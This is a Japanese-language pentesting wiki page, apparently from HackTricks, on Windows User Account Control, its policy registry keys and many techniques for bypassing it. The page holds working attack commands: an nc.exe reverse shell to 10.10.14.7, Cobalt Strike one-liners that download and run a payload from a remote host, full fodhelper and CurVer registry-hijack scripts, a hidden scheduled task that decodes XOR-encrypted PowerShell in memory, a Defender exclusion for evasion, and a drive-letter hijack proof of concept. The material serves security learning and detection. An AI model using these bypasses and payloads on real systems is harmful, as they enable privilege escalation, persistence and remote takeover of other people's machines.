# UAC - ユーザーアカウント制御

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、昇格した操作に対する同意プロンプトを有効にする機能です。アプリケーションは異なる `integrity` レベルを持ち、`high` レベルのプログラムはシステムを潜在的に危険にさらす可能性のある操作を実行できます。UAC が有効な場合、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可して実行させない限り、アプリケーションとタスクは常に非管理者アカウントのセキュリティコンテキストで実行されます。これは管理者を意図しない変更から保護する便宜上の機能ですが、セキュリティ境界とは見なされません。

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザには 2 つのトークンが与えられます: 通常の操作を行うための標準ユーザ用トークンと、管理者権限を持つトークンです。

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. 管理者はセキュリティポリシーを使用して、ローカルレベル（secpol.msc を使用）で組織固有の UAC の動作を構成したり、Active Directory ドメイン環境では Group Policy Objects (GPO) を介して構成・配布したりできます。各種設定の詳細は [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) に記載されています。UAC に設定できる Group Policy は 10 個あります。以下の表は追加情報を提供します:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (セキュアデスクトップで非Windowsバイナリに対して同意を求める) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (セキュアデスクトップで資格情報を求める)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効; Enterprise ではデフォルトで無効)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Policies for installing software on Windows

ローカルのセキュリティポリシー（ほとんどのシステムでは "secpol.msc"）はデフォルトで非管理者ユーザによるソフトウェアのインストールを防ぐように設定されています。つまり、非管理者ユーザがインストーラをダウンロードできたとしても、管理者アカウントなしでは実行できません。

### Registry Keys to Force UAC to Ask for Elevation

管理者権限を持たない標準ユーザとして、特定の操作を行おうとしたときに UAC が標準アカウントに資格情報の入力を促すようにできます。この操作は特定の **registry keys** を変更する必要があり、管理者権限が必要です（**UAC bypass** がある場合や攻撃者が既に管理者でログオンしている場合を除く）。

ユーザが **Administrators** グループに所属している場合であっても、これらの変更は管理操作を行うためにユーザに **アカウント資格情報の再入力** を強制します。

**唯一の欠点は、この方法が動作するためには UAC を無効にする必要があり、本番環境でそのようになっていることは稀である点です。**

変更すべきレジストリキーとエントリは次のとおりです（括弧内は既定値）:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy ツールから手動で行うこともできます。変更後は、管理操作時にユーザに資格情報の再入力が求められます。

### Note

**User Account Control is not a security boundary.** したがって、標準ユーザはローカル権限昇格の脆弱性がない限りアカウントから抜け出して管理者権限を取得することはできません。

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC 権限

- Internet Explorer Protected Mode は、整合性チェックを使用して高整合性レベルのプロセス（例：ウェブブラウザ）が低整合性レベルのデータ（例：一時インターネットファイルフォルダ）にアクセスするのを防ぎます。これはブラウザを低整合性トークンで実行することで実現されます。ブラウザが低整合性ゾーンに保存されたデータへアクセスしようとすると、OS はプロセスの整合性レベルを確認して適切にアクセスを許可します。この機能はリモートコード実行攻撃がシステム上の機密データにアクセスするのを防ぐのに役立ちます。
- ユーザーが Windows にログオンすると、システムはユーザーの権限の一覧を含むアクセス トークンを作成します。権限はユーザーの権利と能力の組み合わせとして定義されます。トークンには、コンピュータやネットワークリソースに対してユーザーを認証するために使用されるcredentialsの一覧も含まれます。

### Autoadminlogon

Windows を起動時に特定のユーザーで自動ログオンさせるには、**`AutoAdminLogon` registry key** を設定します。これはキオスク環境やテスト目的で便利です。パスワードがレジストリに露出するため、安全なシステムでのみ使用してください。

Registry Editor または `reg add` を使って次のキーを設定します:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常のログオン動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> グラフィカルに被害者の端末にアクセスできる場合、UAC bypass は非常に簡単で、UAC プロンプトが表示されたら単に "Yes" をクリックすれば良い点に注意してください

UAC bypass が必要になる状況は次の通りです：**UAC が有効で、プロセスが中程度の整合性コンテキストで動作しており、ユーザーが管理者グループに属している**。

特に重要なのは、UAC が最高のセキュリティレベル（Always）に設定されている場合、他のどのレベル（Default）よりも**UAC をバイパスするのがはるかに難しい**という点です。

### UAC 無効

もし UAC が既に無効（`ConsentPromptBehaviorAdmin` は **`0`**）であれば、次のような方法で**reverse shell を管理者権限（高整合性レベル）で実行**できます：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常に** 基本的な UAC "bypass"（フルファイルシステムアクセス）

Administrators グループに所属するユーザーの shell を持っている場合、ローカルで SMB 経由の共有を新しいドライブに **mount the C$** し、**ファイルシステム内のすべてにアクセス** できます（Administrator のホームフォルダも含む）。

> [!WARNING]
> **このトリックはもう動作しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike の手法は、UAC が最大のセキュリティレベルに設定されていない場合にのみ機能します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には **UAC** を **bypass** するモジュールがいくつかあります。

### KRBUACBypass

ドキュメントとツール: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は複数の UAC bypass exploits をまとめた **compilation** です。**compile UACME using visual studio or msbuild** が必要になる点に注意してください。コンパイルにより複数の executables（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）が生成されるため、どれが必要かを把握しておく必要があります。\
一部の bypass は他のプログラムをプロンプト表示させ、ユーザーに何かが起きていることを警告する場合があるので、**be careful** してください。

UACME には各手法が動作し始めた **build version** が記載されています。自分のバージョンに影響する手法を検索できます:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[this](https://en.wikipedia.org/wiki/Windows_10_version_history) ページを使用すると、ビルド バージョンから Windows リリース `1607` を取得できます。

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリ `fodhelper.exe` はモダンな Windows で自動的に昇格されます。起動時、`DelegateExecute` 動詞を検証せずに以下のユーザーごとのレジストリ パスを照会します。そこにコマンドを植え付けると、Medium Integrity プロセス（ユーザーが Administrators グループに所属）から UAC prompt なしで High Integrity プロセスを生成できます。

fodhelper が照会するレジストリ パス:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell の手順（payload を設定してからトリガー）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注意:
- 現在のユーザーが Administrators のメンバーであり、UAC レベルがデフォルト/寛容（追加制限のある Always Notify ではない）場合に動作します。
- `sysnative` パスを使用して、64-bit Windows 上で 32-bit プロセスから 64-bit PowerShell を起動します。
- ペイロードは任意のコマンド（PowerShell、cmd、または EXE のパス）にできます。ステルスのため、プロンプトを表示する UI は避けてください。

#### CurVer/extension hijack variant (HKCU only)

Recent samples abusing `fodhelper.exe` avoid `DelegateExecute` and instead **`ms-settings` の ProgID をリダイレクト** するために、ユーザーごとの `CurVer` 値を利用します。自動昇格されるバイナリは依然として `HKCU` 下でハンドラを解決するため、キーを配置するのに管理者トークンは不要です:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
権限昇格後、malwareは一般的に`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`を`0`に設定して**今後のプロンプトを無効化する**ことが多く、その後追加の防御回避（例: `Add-MpPreference -ExclusionPath C:\ProgramData`）を行い、高い権限で実行するために永続化を再作成します。典型的な永続化タスクは、ディスクに**XOR-encrypted PowerShell script**を保存し、毎時それをメモリ内でデコード／実行します：
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ が動作するはずです)

### UAC Bypass with GUI

GUI にアクセスできる場合、プロンプトが表示されたら**UAC プロンプトをそのまま承認**すればよく、実際にはバイパスは不要です。つまり、GUI へのアクセスがあれば UAC を回避できます。

さらに、誰かが使用していた GUI セッション（場合によっては RDP 経由）を取得できれば、管理者として実行されているいくつかのツールから、UAC の再確認なしに例えば **cmd** を **as admin** で直接実行できることがあります（例: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)）。これはやや**stealthy**かもしれません。

### Noisy brute-force UAC bypass

騒音を気にしないなら、ユーザが受け入れるまで権限昇格を要求し続けるような [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなツールを**実行する**こともできます。

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考文献
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
